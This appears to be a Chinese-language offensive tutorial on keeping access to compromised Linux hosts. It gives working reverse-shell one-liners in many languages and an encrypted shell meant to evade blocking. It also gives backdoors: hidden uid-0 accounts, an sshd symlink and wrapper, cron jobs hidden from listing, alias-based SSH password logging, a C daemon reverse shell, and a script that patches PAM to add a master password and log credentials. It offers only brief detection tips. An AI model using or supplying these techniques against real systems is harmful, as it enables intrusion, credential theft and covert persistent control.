# 

# Linux下的权限维持


# 权限维持 -- Linux

## 一、Basic Knowledge

### 1. 概念

可以简单理解为通过隐藏手段或在目标上安装后门以保持已获取的权限不会被打掉，一直控制目标，属于后渗透阶段的重点内容。

### 2. 前置条件 -- 获取初始权限

获取初始权限。最常见也是个人最喜欢的是反弹shell回来，方便后续操作。这里简单总结下反弹shell的常见手法：

#### 1. Bash反弹

攻击机监听：

```bash
nc -lvvp port
```

目标执行：

```bash
bash -i >& /dev/tcp/x.x.x.x/port 0>&1

```

或者

```bash
bash -i 5<>/dev/tcp/host/port 0>&5 1>&5
```

- `bash -i`：打开一个交互的bash
- `>& /dev/tcp/x.x.x.x/port`：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。
- `0>&1`：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。

第二种则是将标准输入、输出和错误均重定向到socket连接文件。

**备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。**

#### 2. telnet反弹

第一种：

攻击机开2个终端，分别执行监听：

```bash
nc -lv port1
```

和

```bash
nv -lv port2
```

目标主机执行：

```bash
telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2
```

监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。

第二种：

攻击机监听：

```bash
nc -lv port
```

目标主机执行：

```bash
rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0</tmp/a | /bin/bash 1>tmp/a
```

其中x.x.x.x为攻击机ip。

#### 3. nc(netcat)反弹

攻击机监听：

```bash
nc -lv port
```

目标执行：

```bash
nc -e /bin/bash x.x.x.x port
```

如果目标上没有`-e`参数可以使用以下命令：

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>$1 | nc x.x.x.x port >/tmp/f
```

`mkfifo`的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。

此外，也可以使用telnet的监听2个端口的方式：

```bash
nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2
```

#### 4. 常见脚本反弹

下述脚本均需要现在攻击机上开启监听：`nc -lv port`，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。

##### 1. Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

##### 2. Perl

1. 第一种：

   ```perl  
    perl -e 'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```

2. 第二种：

   ```perl
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
   ```

##### 3. Ruby

1. 第一种：

   ```ruby
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
   ```

2. 第二种：

   ```ruby
    ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
   ```

##### 4. PHP

```php
php -r '$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

##### 5. Java

```java
public class Revs {
    /**
    * @param args
    * @throws Exception 
    */
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/port;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

##### 6. Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

#### 3. 其他方法

##### 1. socat

攻击机监听：

```bash
socat file:`tty`,raw,echo=0 tcp-listen:port
```

上传socat到目标主机，然后执行：

```bash
socat exec:'bash -li',pty,stderr,setid,sigint,sane tcp x.x.x.x:port
```

##### 2. 只有80和443端口且反弹shell流量被拦截

方法论：加密流程，绕过拦截

Step 1：VPS上生成SSL证书的公钥/私钥对

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

Step 2：VPN监听反弹shell

```bash
openssl s_server -quiet  -key key.pem -cert cert.pem -port 443
```

Step 3：连接

```bash
mkfifo /tmp/v4ler1an;/bin/bash -i < /tmp/v4ler1an 2>&1 |openssl s_client -quiet -connect x.x.x.x:443 > /tmp/v4ler1an
```

此时的shell存在缺陷（无法命令补全等），通过以下方法修复：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

`pty`是一个伪终端模块。`pty.spawn(argv[, master_read[, stdin_read]])`产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。
在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值

## 二、权限维持方法

### 1. 一句话添加用户和密码

添加普通用户：

```bash
# 创建一个用户名guest，密码为123456的普通用户

useradd -p `openssl passwd -1 -salt 'salt' 123456` guest

# useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。
useradd -p "$(openssl passwd -1 123456)" guest

# chpasswd方法
useradd guest;echo 'guest:123456'|chpasswd

# echo -e方法
useradd guest;echo -e "123456\n123456\n" |passwd guest
```

添加root用户：

```bash
# 创建一个用户名为guest，密码为123456的root用户
useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest
```

排查方法：

```bash
# 查询特权用户（uid = 0）
awk -F: '$3==0{print $1}' /etec/passwd
# 查询可以远程登录的帐号信息
awk '/\$1|\$6/{print $1}' /etc/shadow
# 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"
```

### 2. 增加超级用户

在完成用户添加后，可以对添加的用户赋予超级用户权限。

目标主机执行：

```bash
echo "v4ler1an:x:0:0::/:/bin/sh" >> /etc/passwd
```

如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号：

```bash
echo "v4ler1an::-1:-1:-1:-1:-1:-1:500" >> /etc/shadow
```

有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。

### 1. SSH后门

#### 1. sshd 软连接

目标主机建立软连接：

```bash
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;
```

攻击机直接ssh登录

```bash
ssh root@x.x.x.x -p 5555
```

这里端口可以任意，但是`/tmp/su`部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为`sufficient`时只要`pam_rootok`模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 `/tmp/su` 在`/etc/pam.d/`目录下寻找对应的PAM配置文件(如: `/etc/pam.d/su`)，任意密码登陆的核心是`auth sufficient pam_rootok.so`，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见[Linux的一个后门引发对PAM的探究](http://www.91ri.org/16803.html)。

缺点：易被排查，通过进程、端口可以轻松看到异常，使用`kill -s 9 PID`即可清除后门。

#### 2. ssh免密后门(文件落地)

在攻击机上生成一对公私钥，然后将公钥上传到目标主机，路径为`~/.ssh/authorized_keys`，攻击机本地保存私钥。通过ssh登录，ssh程序会发送私钥到目标主机与公钥进行匹配，匹配通过即可实现ssh登录。

生成公钥和私钥：

```bash
ssh-keygen -t rsa
```

进入`/root/.ssh`，将公钥`id_rsa.pub`的内容复制到目标主机（是否上传替换文件取决于具体情况），在`/root/.ssh/authorized_keys`中追加`id_rsa.pub`中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。)

缺点：易被排查，检查`/root/.ssh/authorized_keys`是否被修改，清理不受信的公钥即可清除后门。

#### 3. ssh wrapper（文件落地）

目标主机上执行：

```bash
cd /usr/sbin/
mv sshd ../bin/
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart
```

完成后执行`cat sshd`进行验证，输出如下则说明配置成功：

```bash
#!/usr/bin/perl
exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);
exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,
```

攻击机上执行：

```bash
socat STDIO TCP4:x.x.x.x:22,sourceport=13377
```

这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。

```bash
python
>>> import struct
>>> buffer = struct.pack('>I6',19256)
>>> print repr(buffer)
'\x00\x00LF'
>>> buffer = struct.pack('>I6',13377)
>>> print buffer
4A
```

原理简单说明：`init`首先启动的是`/usr/sbin/sshd`,脚本执行到`getpeername`这里的时候，正则匹配会失败，于是执行下一句，启动`/usr/bin/sshd`，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的`/usr/sbin/sshd`，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，`getpeername`能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell

简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。

排查方法：

```bash
ls -al /usr/sbin/sshd
cat /usr/sbin/sshd
```

如果想彻底恢复的话，需要进行ssh服务的重装。

#### 4. ssh的隐身登录

在进行ssh登录时可以使用以下命令实现隐身登录，避免被`last\who\w`等指令检测到。

```bash
# 不被last\who\w等指令检测
ssh -T username@x.x.x.x /bin/bash -i

# 不记录ssh公钥在本地.ssh目录中
ssh -o UserKnownHostFile=/dev/null -T user@x.x.x.x /bin/bash -if
```

### 3. SUID Shell

需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限：

```bash
cp /bin/bash /dev/.rootshell
chmod u+s /dev/.rootshell
```

备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。

### 4. crontab后门（文件落地）

`crontab`命令用于设置周期性被执行的指令，可以利用该命令新建shell脚本，利用脚本进行反弹。

Step 1 ：创建shell脚本，例如在/etc/evil.sh

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.160.154/12345  0>&1
```

并给脚本赋予相应权限：

```bash
chmod +sx /etc/evil.sh
```

Step 2：设置定时服务

```bash
crontab -e
```

输入以下内容：

```bash
# exec per min

*/1 * * * * root /etc/evil.sh
```

重启crond服务，`service crond restart`，然后使用nc接收shell。

上述方法在实际测试中成功了率较低，建议使用一句话后门：

```bash
(crontab -l;printf "*/1 * * * * /tmp/crontab_backdoor.sh;\rno crontab for `whoami`%100c\n")|crontab -
```

这种方式成功率更高，而且不易被`crontab -l`发现。

其中关于crondtab的详细原理可以参考：<https://cloud.tencent.com/developer/article/1683265>

排查手段：

```bash
# 查看可以的定时任务列表
crontab -e
```

### 5. alias欺骗（文件落地）

可以通过`alias`命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例：

1. 修改ssh命令，利用strace，使其具有记录ssh对read、write、connect调用的功能：

    ```bash
    alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'
    ```

2. 利用守护进程回弹shell

   ```bash
   alias cat='cat&&/root/.shell'
   ```

回弹shell的c语言版脚本：

```c
// shell.c

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <signal.h>

#define ERR_EXIT(m) 
do
{
    perror(m);
    exit(EXIT_FAILURE);
}
while (0);

void creat_daemon(void);
int main(void)
{
    time_t t;
    int fd;
    creat_daemon();
    // 将ip和端口进行替换
    system("bash -i >& /dev/tcp/192.168.80.147/12345 0>&1");
    return 0;
}

void creat_daemon(void)
{
    pid_t pid;
    int devnullfd,fd,fdtablesize;
    umask(0);

    pid = fork();
    if( pid == -1)
        ERR_EXIT("fork error");
    if(pid > 0 )
        exit(EXIT_SUCCESS);
    if(setsid() == -1)
        ERR_EXIT("SETSID ERROR");
    chdir("/");

    /* close any open file descriptors */
    for(fd = 0, fdtablesize = getdtablesize(); fd < fdtablesize; fd++)
        close(fd);

    devnullfd = open("/dev/null", 0);

    /* make STDIN ,STDOUT and STDERR point to /dev/null */
    if (devnullfd == -1) {
        ERR_EXIT("can't open /dev/null");
    }
    if (dup2(devnullfd, STDIN_FILENO) == -1) {
        ERR_EXIT("can't dup2 /dev/null to STDIN_FILENO");
    }
    if (dup2(devnullfd, STDOUT_FILENO) == -1) {
        ERR_EXIT("can't dup2 /dev/null to STDOUT_FILENO");
    }
    if (dup2(devnullfd, STDERR_FILENO) == -1) {
        ERR_EXIT("can't dup2 /dev/null to STDOUT_FILENO");
    }
    signal(SIGCHLD,SIG_IGN); 
    return;
}
```

使用nc监听回弹的shell。

### 6. Linux PAM密码记录后门（文件落地）

PAM(Pluggable Authentication Modules)，是由Sun提出的一种认证机制。它通过一共一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的账号密码。其大致流程如下：

1. 获取目标系统所使用的PAM版本，下载对应版本的pam版本
2. 解压缩，修改pam_unix_auth.c文件，添加万能密码
3. 编译安装PAM
4. 编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。

一个自动化脚本如下：

```bash
#!/bin/bash
## 
##查看版本:
##redhat yum list pam
##debian&Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d' ' -f2
##
PASS='test123' ##......
LOG='\/bin\/.sshlog' ##......

echo "
.___  ___.   ___     ___    _______  ____    ____ 
|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
|  |  |  | | |_| | | |_| | |  '--'  |    |  |     
|__|  |__|  \___/   \___/  |_______/     |__|   "
echo -e "\nPam-Backdoor\n{code this shit while learning pam}\n\n"
oldtime=`stat -c '%z' /lib/security/pam_ftp.so`
echo 'Pam backdoor starting!'
mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz'
#mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'，修改为对应的pam版本
echo 'Fetching from '$mirror_url
wget $mirror_url #fetch the roll
tar zxf Linux-PAM-1.1.1.tar.gz #untar,修改为对应的pam版本
cd Linux-PAM-1.1.1
#find and replace
sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,"'$PASS'")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen("'$LOG'", "a");\n\tfprintf(fp, "%s : %s\\n", name, p);\n\tfclose(fp);\n\t}/g' modules/pam_unix/pam_unix_auth.c
DIS=`head /etc/issue -n 1|awk '{print $1}'`
#get the version
if [ $DIS = "CentOS" ];then
./configure --disable-selinux && make
else
./configure && make
fi
#copy modified pam_unix.so
if [ `uname -p` = 'x86_64' ];then
LIBPATH=lib64
else
LIBPATH=lib
fi
/bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. .........
/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so
touch -d "$oldtime" /lib/security/pam_unix.so
cd .. && rm -rf Linux-PAM-1.1.1*
echo "Done bro.."
```

可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。

Linux PAM版本地址：<http://www.linux-pam.org/library/>

详细情况可参考<https://blog.51cto.com/redkey/1343316>

### 5. PROMPT_COMMAND后门

bash提供来一个环境变量`PROMPT_COMMAND`，这个变量会在执行命令前执行一遍。

```bash
export PROMPT_COMMAND="lsof -i:1025 &>/dev/null || (python -c "exec('encoded_payload'.decode('base64'))" 2>/dev/null &)"
```

也可以使用该变量进行提权：<https://www.anquanke.com/post/id/155943>

### 7. Rootkit

根据搜索情况来看，一般水平的rootkit很容易将系统环境搞崩，而高质量的Rootkit不太容易找，因此如非迫不得已，不是很建议直接使用这种方法。如果能单独进行定制，是另外一种情况。这里暂时先给出一个收集的rootkit库：<https://github.com/d30sa1/RootKits-List-Download>

## 参考文献

1. <https://wiki.bash-hackers.org/howto/redirection_tutorial>
2. <https://www.gnu.org/software/bash/manual/html_node/Redirections.html>
3. <https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/>
4. <https://www.anquanke.com/post/id/171891#h2-15>
5. <https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html>
6. <https://www.anquanke.com/post/id/155943#h2-9>



